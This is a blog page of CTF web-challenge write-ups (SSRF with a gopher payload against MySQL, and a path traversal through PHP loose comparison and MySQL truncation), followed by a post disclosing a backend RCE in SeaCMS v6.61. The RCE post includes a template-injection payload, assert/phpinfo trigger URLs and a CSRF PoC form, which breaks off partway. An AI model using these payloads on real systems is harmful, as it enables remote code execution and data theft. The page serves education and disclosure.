<p></p><p>可以判断这个题目应该是要考ssrf相关的东西。于是首先测试file协议看能不能读到文件，输入<code>file:///etc/passwd</code>，结果题目返回：</p><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> “config.php”;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[‘url’])&amp;&amp;!<span class="keyword">empty</span>($_POST[‘url’]))</span><br><span class="line">&#123;</span><br><span class="line">    $url = $_POST[‘url’];</span><br><span class="line">    $content_url = getUrlContent($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $content_url = “”;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[‘debug’]))</span><br><span class="line">&#123;</span><br><span class="line">    show_source(FILE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p></p>
<p></p><p><code>file://localhost/var/www/html/config.php</code></p><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$hosts = “localhost”;</span><br><span class="line">$dbusername = “ssrf_user”;</span><br><span class="line">$dbpasswd = “”;</span><br><span class="line">$dbname = “ssrf”;</span><br><span class="line">$dbport = <span class="number">3306</span>;</span><br><span class="line"></span><br><span class="line">$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initdb</span><span class="params">($conn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$dbinit = “create table <span class="keyword">if</span> not exists flag(secret varchar(<span class="number">100</span>));”;</span><br><span class="line"><span class="keyword">if</span>(mysqli_query($conn,$dbinit)) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$tmpurl = parse_url($url, PHP_URL_HOST);</span><br><span class="line"><span class="keyword">if</span>($tmpurl != “localhost” <span class="keyword">and</span> $tmpurl != “<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>”)</span><br><span class="line">&#123;</span><br><span class="line">var_dump($tmpurl);</span><br><span class="line"><span class="keyword">die</span>(“&lt;h1&gt;Only access to localhost&lt;/h1&gt;”);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $url;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUrlContent</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">$url = safe($url);</span><br><span class="line">$url = escapeshellarg($url);</span><br><span class="line">$pl = “curl “.$url;</span><br><span class="line"><span class="keyword">echo</span> $pl;</span><br><span class="line">$content = shell_exec($pl);</span><br><span class="line"><span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">initdb($conn);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p></p>
<p></p><p>可以看到在config.php中告诉我们flag在数据库中且给出了我们一个空密码的mysql账户。因此我们便可以联想到34c3ctf中的一道<a href="http://www.freebuf.com/articles/web/159342.html">使用gopher协议攻击mysql的题目</a>。</p><p></p>
<p></p><p>这里gopher协议的主要功能是可以直接发起socket连接获取数据，而且由于mysql这里给出的密码是空密码，因此可以通过gopher发起sql请求来获取数据。<br><br>因此我们可以在本地用mysql搭建同样的环境，使用mysql客户端进行一次连接并获取执行读取flag的操作，用wireshark抓包后将抓取到的数据urlencode之后构造成符合gopher结构的payload即可获取到最后的flag。<br><br>首先我们创建相同的用户和同样的表结构：<img class="aligncenter" title="database" alt="database" src="https://p3.ssl.qhimg.com/t013058e72ceef9e2ac.png">然后给该用户此数据库的权限后使用该用户登入，获取该数据库内的flag信息，同时使用wireshark抓取lo上的包:<br><img class="aligncenter" alt="" src="https://p2.ssl.qhimg.com/t015c3a4af5175d3803.png"><br><img class="aligncenter" alt="" src="https://p4.ssl.qhimg.com/t015505823f6c7c57ab.png">wireshark中我们设置只显示客户端发送的数据包，以原始数据的形式显示<br><img class="aligncenter" alt="" src="https://p3.ssl.qhimg.com/t011d0763eeb24df413.png">将数据复制下来转换成urlencode的形式，构造gopher的链接为：</p><p></p>
<p><pre><code>gopher://127.0.0.1:3306/_%A8%00%00%01%85%A6%FF%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00ssrf_user%00%00mysql_native_password%00f%03_os%05Linux%0C_client_name%08libmysql%04_pid%0519500%0F_client_version%065.7.22%09_platform%06x86_64%0Cprogram_name%05mysql%21%00%00%00%03select%20%40%40version_comment%20limit%201%12%00%00%00%03SELECT%20DATABASE%28%29%05%00%00%00%02ssrf%0F%00%00%00%03show%20databases%0C%00%00%00%03show%20tables%06%00%00%00%04flag%00%13%00%00%00%03select%20%2A%20from%20flag%01%00%00%00%01<br></code></pre></p>
<p></p><p>最后可以在回显中获取flag<br><img class="aligncenter" alt="" src="https://p5.ssl.qhimg.com/t019c4894b8888e1928.png"></p><p></p>
<p></p><p> </p><p></p>
<p></p><h2 name="h2-2" id="h2-2">NNService</h2><p></p>
<p><blockquote><p><a href="http://35.240.231.243/">题目地址</a></p></blockquote></p>
<p></p><p>先扫描查看是否存在源码泄露，发现存在robots.txt,提示存在源码bk/bk.zip,访问即可获取题目的源码。<br><br>这里我们主要分析题目最后导致getflag的两个点，在<code>index.controller.php</code>中,首先分析更改个人信息的位置上传头像的点:</p><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_FILES[‘avatar’] <span class="keyword">and</span> $_FILES[“avatar”][“error”] == <span class="number">0</span>)&#123;</span><br><span class="line">     <span class="keyword">if</span>((($_FILES[“avatar”][“type”] == “image/gif”) <span class="keyword">or</span> ($_FILES[“avatar”][“type”] == “image/jpeg”) <span class="keyword">or</span> ($_FILES[“avatar”][“type”] == “image/png”)) <span class="keyword">and</span> $_FILES[‘avatar’][‘size’]&lt;<span class="number">65535</span>)&#123;</span><br><span class="line">         $info=getimagesize($_FILES[‘avatar’][‘tmp_name’]);</span><br><span class="line">         <span class="keyword">if</span>(@is_array($info) <span class="keyword">and</span> array_key_exists(‘mime’,$info))&#123;</span><br><span class="line">             $type=explode(‘/‘,$info[‘mime’])[<span class="number">1</span>];</span><br><span class="line">             $filepath=<span class="keyword">$this</span>-&gt;user-&gt;getuser().”.”.$type;</span><br><span class="line">             $filename=”uploads/“.$filepath;</span><br><span class="line">             <span class="keyword">if</span>(is_uploaded_file($_FILES[‘avatar’][‘tmp_name’]))&#123;</span><br><span class="line">                 <span class="keyword">$this</span>-&gt;user-&gt;edit(“avatar”,<span class="keyword">array</span>($filepath,$type));</span><br><span class="line">                 <span class="keyword">if</span>(strpos($filepath,”..”) !== <span class="keyword">false</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">die</span>(“Hacker, cut please!”);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span> <span class="keyword">if</span>(move_uploaded_file($_FILES[‘avatar’][‘tmp_name’], $filename))&#123;</span><br><span class="line">                     quit_and_refresh(‘Upload success!’,’edit’);</span><br><span class="line">                 &#125;</span><br><span class="line">                 quit_and_refresh(‘Success!’,’edit’);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="comment">//TODO！report it！</span></span><br><span class="line">             quit(‘Only allow gif/jpeg/png files smaller than <span class="number">64</span>kb!’);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span>&#123;</span><br><span class="line">         <span class="comment">//TODO！report it！</span></span><br><span class="line">         quit(‘Only allow gif/jpeg/png files smaller than <span class="number">64</span>kb!’);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p></p>
<p></p><p>分析代码流程，首先判断图片的mime类型，然后使用getimagesize获取图片的信息，之后从getimagesize获取到的图片信息中获取图片的后缀名，之后可以看到<code>$filepath=$this-&gt;user-&gt;getuser().”.”.$type;</code>，将用户名与图片名称拼接为图片上传路径，后调用<code>$this-&gt;user-&gt;edit(“avatar”,array($filepath,$type));</code>,跟到<code>user.class.php</code>文件中可以发现这一步的操作实质是将文件名写入了数据库中。之后<strong>使用强等于</strong>判断文件名中是否含有<code>..</code>，如果含有<code>..</code>则终止整个流程，否则将移动上传的图片到upload文件夹下，命名为<code>用户名.文件类型</code>;<br><br>然后我们再分析export处的源码：</p><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">export</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $avatar=<span class="keyword">$this</span>-&gt;user-&gt;getavatar();</span><br><span class="line">        <span class="keyword">if</span>(substr($avatar,<span class="number">0</span>,<span class="number">5</span>)!==”data:”)&#123;</span><br><span class="line">            $fileavatar=substr(<span class="keyword">$this</span>-&gt;user-&gt;getavatar(),<span class="number">1</span>);</span><br><span class="line">            $avatar = “uploads/“.$fileavatar;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(file_exists($avatar) <span class="keyword">and</span> filesize($avatar)&amp;lt;<span class="number">65535</span> <span class="keyword">and</span> strpos($fileavatar,<span class="string">".."</span>)==<span class="keyword">false</span>)&#123;</span><br><span class="line">        $data=file_get_contents($avatar);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&amp;gt;user-&amp;gt;updateavatar($data)) quit(<span class="string">'Something error!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//TODO！report it！</span></span><br><span class="line">        $out=<span class="string">"Your avatar is invalid, so we reported it"</span>.<span class="string">"&amp;lt;/p&amp;gt;"</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">"templates/error.html"</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&amp;lt;br&amp;gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$article=<span class="keyword">$this</span>-&amp;gt;user-&amp;gt;getarticle();</span><br><span class="line">$data=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&amp;lt;count($article);$i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>($i!=count($article)<span class="number">-1</span>)&#123;</span><br><span class="line">        $data.=$article[$i][<span class="number">2</span>].<span class="string">"rn"</span>;</span><br><span class="line">        $data.=$article[$i][<span class="number">3</span>].<span class="string">"n"</span>;</span><br><span class="line">        $data.=<span class="string">"----------n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $data.=$article[$i][<span class="number">2</span>].<span class="string">"rn"</span>;</span><br><span class="line">        $data.=$article[$i][<span class="number">3</span>].<span class="string">"n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$data.=<span class="string">"==========n"</span>;</span><br><span class="line">$avatar=<span class="keyword">$this</span>-&amp;gt;user-&amp;gt;getavatar(<span class="number">1</span>);</span><br><span class="line">$data.=base64_encode($avatar[<span class="number">1</span>]).<span class="string">"n"</span>;</span><br><span class="line">$data.=$avatar[<span class="number">3</span>];</span><br><span class="line">header(<span class="string">"Content-type: application/octet-stream"</span>);</span><br><span class="line">header(<span class="string">"Content-Transfer-Encoding: binary"</span>);</span><br><span class="line">header(<span class="string">"Accept-Ranges: bytes"</span>);</span><br><span class="line">header(<span class="string">"Content-Length: "</span>.strlen($data));</span><br><span class="line">header(<span class="string">"Content-Disposition: attachment; filename="</span><span class="string">".$this-&amp;gt;user-&amp;gt;getuser()."</span><span class="string">""</span>);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p>
<p></p><p>可以看到export处的代码在进行导出时，首先调用<code>$avatar=$this-&gt;user-&gt;getavatar();</code>获取头像的信息，我们跟到<code>user.class.php</code>中可以发现这一步操作便是将我们之前写入数据库的文件名取出。然后这里的代码对文件进行判断，判断文件是否存在，文件大小是否小于65535，以及<strong>使用弱等于</strong>判断文件名中是否含有<code>..</code>。之后便获取文件内容并base64加密后拼接上之前的一些信息输出文件。<br><br>这里我们可以看到主要的漏洞点在于写入数据库的操作在判断文件名是否包含<code>..</code>之前，因此我们即使文件名中包含了<code>..</code>最后不合法的文件名也会被写入数据库。而在之后export处读取到文件名后使用的是弱等于判断：</p><p></p>
<p><pre><code class="lang-php">strpos($fileavatar,”..”)==false<br></code></pre></p>
<p></p><p>然而当我们构造类似<code>../flag.php</code>的字符串时，strpos返回<code>..</code>出现的位置0，而<code>0==false</code>成立。因此我们便可以成功实现目录穿越。<br><br>但是这里还有一点：我们的文件名的生成方式是<code>用户名.文件类型</code>,文件类型由getimagesize()函数获得，因此只能是图片文件的后缀名，那么怎样才能截断这个后缀名从而成功获取<code>flag.php</code>的源码？<br><br>这里我们查看之前下载到的源码中的sql文件:</p><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> <span class="keyword">users</span> (</span><br><span class="line">  <span class="keyword">id</span> <span class="built_in">int</span>(<span class="number">32</span>) primary <span class="keyword">key</span> auto_increment,</span><br><span class="line">  username <span class="built_in">varchar</span>(<span class="number">100</span>) <span class="keyword">UNIQUE</span> <span class="keyword">KEY</span>,</span><br><span class="line">  nickname <span class="built_in">varchar</span>(<span class="number">100</span>) <span class="keyword">UNIQUE</span> <span class="keyword">KEY</span>,</span><br><span class="line">  <span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">32</span>),</span><br><span class="line">  email <span class="built_in">varchar</span>(<span class="number">100</span>) <span class="keyword">UNIQUE</span> <span class="keyword">KEY</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> articles (</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">int</span>(<span class="number">32</span>) primary <span class="keyword">key</span> auto_increment,</span><br><span class="line">user_id <span class="built_in">int</span>(<span class="number">32</span>),</span><br><span class="line">title <span class="built_in">varchar</span>(<span class="number">100</span>),</span><br><span class="line"><span class="keyword">content</span> <span class="built_in">varchar</span>(<span class="number">500</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> avatar (</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">int</span>(<span class="number">32</span>) primary <span class="keyword">key</span> auto_increment,</span><br><span class="line"><span class="keyword">data</span> <span class="built_in">blob</span>,</span><br><span class="line">user_id <span class="built_in">int</span>(<span class="number">32</span>) <span class="keyword">UNIQUE</span> <span class="keyword">KEY</span>,</span><br><span class="line">filepath <span class="built_in">varchar</span>(<span class="number">100</span>),</span><br><span class="line">photo_type <span class="built_in">varchar</span>(<span class="number">20</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p></p>
<p></p><p>可以看到这里的sql文件中限制了图片路径<code>filepath</code>字段的长度最多为100，用户名<code>username</code>的长度也最多为100。这里便可以联想到mysql的一个性质：<code>当mysql开启宽松模式时，在INSERT的时候，如果你插入的字符超出了MySQL的字段长度，MySQL会自动截断到最大长度然后插入，并不会出错。</code>，具体可以参考这篇文章：<a href="http://www.91ri.org/5963.html">http://www.91ri.org/5963.html</a><br><br>因此我们如果注册长度为100的用户名，在将文件名写入数据库时，用户名之后拼接的后缀便会被截断从而无法进入数据库，因此便实现了我们对文件的控制。<br><br>最后解题的方法为：</p><p></p>
<ul><br><li>注册用户名：<code>..//////////////////////////////////////////////////////////////////////////////////////////flag.php</code><br></li><br><li>edit处随意上传一张图片</li><br><li>export处导出数据，便可获得flag。</li><br></ul><br><p> </p><br><h2 name="h2-3" id="h2-3">总结</h2><br><p>这场比赛整体难度适中，比较适合新手用于提高自己的水平。此外比赛源码已经上传到<a href="https://github.com/susers/Writeups">https://github.com/susers/Writeups</a>上，欢迎大家star与pull request！</p><br><p> </p><br><h2 name="h2-4" id="h2-4">参考资料</h2><br><ul><br><li><a href="http://php.net/manual/zh/language.operators.comparison.php">http://php.net/manual/zh/language.operators.comparison.php</a></li><br><li><a href="http://www.freebuf.com/articles/web/159342.html">http://www.freebuf.com/articles/web/159342.html</a></li><br><li><a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2">https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2</a></li><br><li><a href="http://www.91ri.org/5963.html">http://www.91ri.org/5963.html</a></li><br></ul>

          
        
      
    </div>

    

    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/seacms-backend-getshell/index.html">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/seacms-backend-getshell/index.html" itemprop="url">
                  seacms backend getshell
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-07-18 11:30:58" itemprop="dateCreated datePublished" datetime="2018-07-18T11:30:58+08:00">2018-07-18</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/" itemprop="url" rel="index"><span itemprop="name">Ctf</span></a></span>

                
                
                  , 
                
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Ctf/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="backend-RCE-in-the-latest-version-of-SeaCMS-v6-61"><a href="#backend-RCE-in-the-latest-version-of-SeaCMS-v6-61" class="headerlink" title="backend RCE in the latest version of SeaCMS(v6.61)"></a>backend RCE in the latest version of SeaCMS(v6.61)</h1><p>In SeaCMS’s admin platform, just in the page of publishing movies,due to the low limitation of the code injected in the picture’s url,we can execute random code to getshell.though there are some way’s in the /include/main.class to limit the usage of the code,we can find ways to bypass it.<br>So How does this vul be triggerd? here are some Steps:  </p>
<ul>
<li>Firstly login to the admin panel, in this case the admin directory is adjusted to <code>/backend</code>.<br><img src="http://p7lc13qga.bkt.clouddn.com/backend.PNG" alt=""></li>
<li>Secondly add a movie and set it’s pictrue address as <code>{if:1)$GLOBALS[&#39;_G&#39;.&#39;ET&#39;][a]($GLOBALS[&#39;_G&#39;.&#39;ET&#39;][b]);//}{end if}</code><br><img src="http://p7lc13qga.bkt.clouddn.com/add.png" alt=""></li>
<li>After adding it visit <code>/details/index.php?1.html&amp;m=admin&amp;a=assert&amp;b=phpinfo();</code>you can find <code>phpinfo()</code> is executed.<br>here 1.html refers to the id of the video you have just added.In my case, the video’s id is 2 so I executed as 2.html.<br><img src="http://p7lc13qga.bkt.clouddn.com/vul.PNG" alt=""></li>
<li>Or you can just visit <code>/search.php?searchtype=5&amp;tid=0&amp;a=assert&amp;b=phpinfo();</code>or any other places that display the video’s pic you have just added.</li>
</ul>
<p>Also in the adding movie page it has no csrf protection so we can use CSRF to attacked it.<br>csrf poc is here:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">history.pushState('', '', '/')</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- adjust action to your url --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/seacms/backend/admin_video.php?action=save&amp;acttype=add"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;commend"</span> <span class="attr">value</span>=<span class="string">"0"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;name"</span> <span class="attr">value</span>=<span class="string">"getshell"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;enname"</span> <span class="attr">value</span>=<span class="string">"ceshi"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;color"</span> <span class="attr">value</span>=<span class="string">"&amp;#35;FF0000"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;type"</span> <span class="attr">value</span>=<span class="string">"5"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;state"</span> <span class="attr">value</span>=<span class="string">"5"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;pic"</span> <span class="attr">value</span>=<span class="string">"&#123;if:1)$GLOBALS['_G'.'ET'][a]($GLOBALS['_G'.'ET'][b]);//&#125;&#123;end if&#125;"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;spic"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;gpic"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;actor"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"v&amp;#95;director"</span> <span class="attr">value</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span 